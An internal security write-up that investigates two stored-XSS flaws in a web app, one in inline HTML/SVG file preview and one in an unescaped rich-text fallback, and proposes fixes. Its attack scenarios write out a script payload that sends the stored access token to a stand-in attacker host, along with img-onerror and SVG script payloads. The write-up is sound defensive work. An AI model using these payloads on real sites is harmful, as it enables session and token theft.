# SEC-006: Stored XSS — File Preview Inline HTML/SVG & Rich-Text Fallback — Investigation & Implementation Write-up

> ~5 pages. Read the real code before writing; cite `file:line`. Be concrete, not generic.

## 1. Summary & Classification

Two independent stored-XSS sinks allow arbitrary JavaScript to execute in the application origin (`http(s)://app.example.com`), where every user session cookie, CSRF token, and the access token persisted in `localStorage["auth-store"]` are in scope.

**Sink A — File manager inline preview.** `app/services/filemanager.py:is_previewable` (line 2869) returns `True` for any MIME type matching `content_type.startswith("text/")` (line 2889), which includes `text/html` and `text/xml`. Both the owned preview endpoint (`GET /v1/fs/preview?path=…`, `app/routers/filemanager.py:2485-2489`) and the shared preview endpoint (`GET /v1/fs/shared-preview`, line 3181-3184) respond with `Content-Disposition: inline` and the file's stored MIME type. Uploading `malicious.html` causes the browser to render the file as an HTML document inside the app origin.

**Sink B — Rich-text `body_plain` fallback.** `frontend/src/pages/feed/MarkdownComposer.tsx:richDocToHtml` (line 133-136) wraps the `fallback` string directly in a `<p>` tag (`return fallback ? \`<p>${fallback}</p>\` : …`) with no HTML escaping. `RichContentRenderer.tsx` (line 62-63) then passes the result of `richDocToHtml` straight to `dangerouslySetInnerHTML`, so any HTML entities in `body_plain` are executed when `body_rich` is absent or empty.

- **Type**: security-fix
- **Priority/Severity**: High (Sink A) / Medium-High (Sink B)
- **Status**: Open
- **Owning area**: File manager + Newsfeed frontend
- **Attacker class**: 🌐 any authenticated user (Sink A requires upload entitlement; Sink B requires the ability to create a newsfeed post)
- **Blast radius**: session/CSRF theft, actions as victim; token exfiltration from `localStorage`
- **Dependencies**: [[SEC-016]] (security headers/CSP), [[SEC-007]] (prod config hardening, `X-Content-Type-Options`)

## 2. Current-State Investigation (what exists today)

### Sink A — File Manager Preview

**`is_previewable` logic (`app/services/filemanager.py:2869-2893`)**

```
2869  def is_previewable(node: Dict[str, Any]) -> bool:
2870      if node.get("is_encrypted"):
2871          return False
2872      content_type = (node.get("content_type") or "").lower()
2873      if content_type.startswith("image/"):  # ← safe
2874          return True
2875      if content_type in {"application/pdf"}:  # ← safe with PDF.js
2876          return True
2877      if content_type in { "text/csv", "application/csv", … }:  # ← mostly safe
2878          return True
2879      if content_type.startswith("text/"):   # ← UNSAFE: includes text/html, text/xml
2880          return True
2881      if content_type in {"application/json", "application/xml"}:  # ← UNSAFE: xml
2882          return True
2883      return False
```

The MIME type stored in DynamoDB is entirely trust-derived from the `Content-Type` the client supplied at upload time. There is no server-side MIME sniffing or override. An attacker uploads `evil.html` with `Content-Type: text/html`; the node record stores `content_type="text/html"`.

**Owned preview (`app/routers/filemanager.py:2443-2489`)**

```
2443  if not is_previewable(node):
2444      raise HTTPException(status_code=415, …)
…
2485  return StreamingResponse(
2486      gen(),
2487      media_type=node.get("content_type", "application/octet-stream"),
2488      headers={"Content-Disposition": f'inline; filename="{node["name"]}"'},
2489  )
```

The response sets `media_type=text/html` and `Content-Disposition: inline`, causing the browser to render the payload as HTML in the current origin.

**Shared preview (`app/routers/filemanager.py:3133-3184`)** follows the identical pattern — `is_previewable` check, same inline response headers. The shared path additionally allows the file owner's peer (whoever received a share) to trigger this endpoint, widening the delivery surface.

**Aggravating factor — `localStorage` token persistence (`frontend/src/stores/authStore.ts:73-80`)**

The Zustand auth store is persisted with `name: "auth-store"` and `partialize` includes `accessToken`. Any XSS can read `JSON.parse(localStorage.getItem("auth-store")).state.accessToken` and exfiltrate a long-lived Bearer token, even though the session cookies are `httpOnly`.

### Sink B — Rich-text Fallback Interpolation

**`richDocToHtml` (`frontend/src/pages/feed/MarkdownComposer.tsx:133-136`)**

```typescript
133  export function richDocToHtml(doc: RichDoc | null | undefined, fallback: string): string {
134    if (!doc?.content?.length) return fallback ? `<p>${fallback}</p>` : "<p><br></p>";
135    return doc.content.map(nodeToHtml).join("");
136  }
```

When `doc` is null or has no content, the entire `fallback` string is embedded inside `<p>…</p>` without any HTML escaping. If `fallback` is `<img src=x onerror=alert(1)>`, the returned string is `<p><img src=x onerror=alert(1)></p>`.

**Rendering site — `RichContentRenderer.tsx:61-63`**

```typescript
61  if (format === "rich" && props.bodyRich) {
62    const richHtml = richDocToHtml((props.bodyRich as RichDoc) ?? null, plain);
63    return <div … dangerouslySetInnerHTML={{ __html: richHtml }} />;
```

When a post is saved with `body_format="rich"` but `body_rich` has an empty `content` array (server round-trip can strip it), `richDocToHtml` falls through to the `fallback` branch and the `body_plain` value is injected unescaped. A creator who can post to the newsfeed can craft the DDB record directly or exploit a client-side path that sends `body_rich: { type: "doc", content: [] }` alongside an XSS payload in `body_plain`.

**Contrast with the markdown path.** `markdownHtmlFromProps` (line 29-35) does `line.replace(/</g, "&lt;").replace(/>/g, "&gt;")` — explicit escaping. The rich path has no equivalent protection.

**Dev vs. prod parity.** Both sinks are fully present in dev and prod. No dev flag gates them.

## 3. Gap / Threat Analysis

### Attack Scenario — Sink A (Stored XSS via file preview)

1. Attacker authenticates as any user with file-upload entitlement.
2. `POST /v1/fs/upload` with a multipart body: `Content-Type: text/html`, file content: `<script>fetch('https://evil.example/'+btoa(localStorage.getItem('auth-store')))</script>`.
3. The file is stored in S3; DynamoDB node record has `content_type: "text/html"`.
4. Attacker shares the file with a victim or tricks the victim into clicking a link like `GET /v1/fs/preview?path=malicious.html`.
5. The browser receives `Content-Type: text/html; Content-Disposition: inline` and executes the script in the app origin.
6. The script exfiltrates `localStorage["auth-store"]` (containing `accessToken`) over CORS to an attacker-controlled server.

**Impact**: persistent token theft; account takeover without any cookie. Recovery requires rotating `UI_ACCESS_TOKEN_SECRET`.

**Preconditions**: upload entitlement (any regular user). SVG payloads also work: `Content-Type: image/svg+xml`, inline `<svg><script>…</script></svg>`. The `image/*` branch of `is_previewable` returns `True` for all image subtypes — including `image/svg+xml`.

**Code sites that must change**:
- `app/services/filemanager.py:2872-2892` — `is_previewable` MIME allowlist
- `app/routers/filemanager.py:2485-2489` — owned preview response headers
- `app/routers/filemanager.py:3181-3184` — shared preview response headers
- Upload ingest: MIME override from file magic bytes (optional hardening)

### Attack Scenario — Sink B (Stored XSS via rich-text fallback)

1. Attacker creates a newsfeed post with `body_format="rich"`, `body_rich={"type":"doc","content":[]}`, `body_plain="<img src=x onerror=steal()>"`.
2. Any viewer of the post who has the rich renderer enabled (`NEWSFEED_RICHTEXT_ENABLED=1`) renders the unescaped `<img>` tag.
3. The `onerror` handler fires and exfiltrates the victim's `auth-store` token.

**Blast radius**: all newsfeed readers who view the attacker's post. Single payload, mass delivery.

## 4. Proposed Design / Fix

### Fix A — Harden `is_previewable` and force `attachment` for unsafe types

**`app/services/filemanager.py:is_previewable`** — remove the broad `text/*` catch-all, add an explicit safe-text allowlist, and explicitly exclude SVG:

```python
# Safe image types (no script execution): exclude SVG
if content_type.startswith("image/") and content_type not in {
    "image/svg+xml", "image/svg"
}:
    return True

# Explicitly safe text types only
if content_type in {
    "text/plain", "text/csv", "text/markdown",
}:
    return True
```

Remove `text/html`, `text/xml`, `application/xml`, `application/json` (the latter two may embed scripts in certain browsers).

**`app/routers/filemanager.py` — preview response headers (lines 2485-2489 and 3181-3184)**

Change `Content-Disposition: inline` to `Content-Disposition: attachment` for any type that is not a browser-safe image or PDF:

```python
# Owned preview (line 2485)
safe_inline = content_type.startswith("image/") or content_type == "application/pdf"
disposition = "inline" if safe_inline else "attachment"
return StreamingResponse(
    gen(),
    media_type="application/octet-stream" if not safe_inline else content_type,
    headers={
        "Content-Disposition": f'{disposition}; filename="{node["name"]}"',
        "X-Content-Type-Options": "nosniff",
    },
)
```

Apply the same change to the shared-preview endpoint (line 3181-3184) and the thumbnail endpoint.

Additionally, set `X-Content-Type-Options: nosniff` on every file-serving response to block browser MIME sniffing.

**MIME override on upload (optional depth-in-defence)**: use `python-magic` to detect the real MIME type from file bytes during ingest; override the client-supplied `Content-Type` for known dangerous types before storing to DynamoDB/S3.

### Fix B — HTML-escape the `richDocToHtml` fallback

**`frontend/src/pages/feed/MarkdownComposer.tsx:134`** — add an `escapeHtml` helper and use it:

```typescript
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

export function richDocToHtml(doc: RichDoc | null | undefined, fallback: string): string {
  if (!doc?.content?.length) return fallback ? `<p>${escapeHtml(fallback)}</p>` : "<p><br></p>";
  return doc.content.map(nodeToHtml).join("");
}
```

This mirrors the escaping already in `markdownHtmlFromProps` (line 33).

### Fix C — Remove access token from `localStorage`

**`frontend/src/stores/authStore.ts:75-80`** — remove `accessToken` from the `partialize` list. Keep it only in React/Zustand in-memory state; re-obtain it from the `ui_access_token` cookie on page load. This shrinks the XSS blast radius to the current tab's in-memory state (no persistent token available to exfiltrate after the user closes the tab).

### Fix D — Content-Security-Policy (see also [[SEC-016]])

Add a `default-src 'self'` CSP that blocks inline scripts and third-party resource loads. Even if XSS is injected, the CSP prevents external data exfiltration. Wire it in `app/main.py:_security_headers_middleware` (already present, line 348-356) as a stricter policy string:

```python
DEFAULT_CSP = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: blob:; "
    "connect-src 'self'; "
    "object-src 'none'; "
    "frame-ancestors 'none';"
)
```

`X-Content-Type-Options: nosniff` (already set in the middleware at line 352) prevents MIME sniffing but only when the server sends it. File-serving responses in the preview endpoint do not currently set this header — it must be added explicitly to the `StreamingResponse` headers.

### Fix E — Upload MIME override

On file ingest, override the client-supplied `Content-Type` with a server-determined type for all uploads. Use `python-magic` to probe the first 512 bytes:

```python
import magic
detected = magic.from_buffer(first_512_bytes, mime=True)
if detected in DANGEROUS_TYPES:
    content_type = "application/octet-stream"
```

`DANGEROUS_TYPES = {"text/html", "image/svg+xml", "text/xml", "application/xml", "application/javascript"}`. This prevents the case where a client uploads `evil.html` with `Content-Type: text/html` and the server trusts that MIME label. Even if `is_previewable` is not updated, the MIME stored in DynamoDB would be `application/octet-stream`, not `text/html`, so inline rendering would never be triggered.

**Dev/Prod parity (SECOPS-007):** All fixes are purely logic changes with no AWS service dependency; they apply identically in dev (moto/mock) and prod. The `python-magic` library must be added to `requirements.txt` and works offline; it uses libmagic byte-pattern signatures with no network calls.

### Manual QA steps

1. In dev, upload `xss.html` with `Content-Type: text/html` and navigate to `GET /v1/fs/preview?path=xss.html` — browser should trigger a download dialog, not render the page. Verify `Content-Disposition: attachment` in response headers.
2. Upload an SVG file containing `<svg><script>alert(document.cookie)</script></svg>` — confirm the preview endpoint returns `Content-Disposition: attachment` and does not execute the script.
3. In dev, create a newsfeed post via curl with `body_plain='<img src=x onerror="alert(1)">'` and `body_rich={"type":"doc","content":[]}`. View the post as another user — confirm the rendered text shows the literal `<img…>` string with entities, and no alert fires.
4. Check `X-Content-Type-Options: nosniff` header is present on all preview and thumbnail responses.
5. Verify `localStorage["auth-store"]` no longer contains `accessToken` after the store `partialize` fix is deployed.

### Observability

- Add `is_dangerous_content_type` field to the `filemgr_file_previewed` audit event when the type was blocked.
- Alert on any `415` response from the preview endpoint where the attempted MIME type is `text/html` or `image/svg+xml`.

### Rollout

1. Deploy `is_previewable` fix and header changes first — no UX impact (downloads instead of inline renders for previously allowed types).
2. Deploy `richDocToHtml` escape fix next — zero-risk output change.
3. Deploy `localStorage` token removal last — requires coordinated frontend deploy; brief session re-auth window if cookie is missing.

**Rollback**: revert the `is_previewable` allowlist change to restore inline preview for text files if needed (does not reintroduce the XSS if the `Content-Disposition` header fix is left in place).

**Effort estimate**: S (1–2 days). All changes are single-file, well-isolated.
